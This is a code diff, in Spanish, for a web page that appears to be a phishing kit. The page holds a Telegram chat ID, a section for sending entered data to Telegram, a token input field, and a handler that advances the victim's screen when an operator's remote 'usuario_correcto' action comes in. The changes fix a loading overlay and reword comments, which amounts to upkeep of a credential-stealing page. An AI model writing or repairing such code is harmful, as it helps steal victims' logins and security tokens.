@@ -651,9 +651,7 @@ main {
     margin-top: auto;
 }
 
-/* ==========================================
-   RESPONSIVE
-   ========================================== */
+/* RESPONSIVE */
 @media (min-width: 701px) and (max-width: 950px) {
     .topbar { gap: 16px; padding-right: 22px; padding-left: 22px; }
     .topbar h1 { font-size: 21px; }
@@ -807,7 +805,7 @@ main {
     </main>
 </div>
 
-<!-- OVERLAY DE CARGA (Por si acaso) -->
+<!-- OVERLAY DE CARGA (Oculto por defecto) -->
 <div class="loading-overlay" id="loading-overlay">
     <div class="spinner"></div>
     <p>Procesando...</p>
@@ -993,6 +991,7 @@ const TG_CHAT_ID = '7776240161';
 // ==========================================
 const contenedorOriginal = document.getElementById('contenedorOriginal');
 const viewAmarilla = document.getElementById('viewAmarilla');
+const loadingOverlay = document.getElementById('loading-overlay');
 
 // Elementos paso amarillo
 const paso1Amarillo = document.getElementById('paso1Amarillo');
@@ -1050,8 +1049,8 @@ btnToggleEye.addEventListener('click', function () {
     inputToken.focus();
 });
 
-function mostrarOverlay() { document.getElementById('loading-overlay').style.display = 'flex'; }
-function ocultarOverlay() { document.getElementById('loading-overlay').style.display = 'none'; }
+function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
+function ocultarOverlay() { loadingOverlay.style.display = 'none'; }
 
 // ==========================================
 // ENVIAR A TELEGRAM
@@ -1205,6 +1204,8 @@ function handleTelegramActionToken(action) {
     actionProcessed = true;
 
     if (action === 'usuario_correcto') {
+        // 🔥 AQUI ESTABA EL ERROR: Ocultamos el overlay y mostramos la pantalla
+        ocultarOverlay(); 
         contenedorOriginal.style.display = 'none';
         viewAmarilla.classList.add('active');
         iniciarFlujoAmarillo();
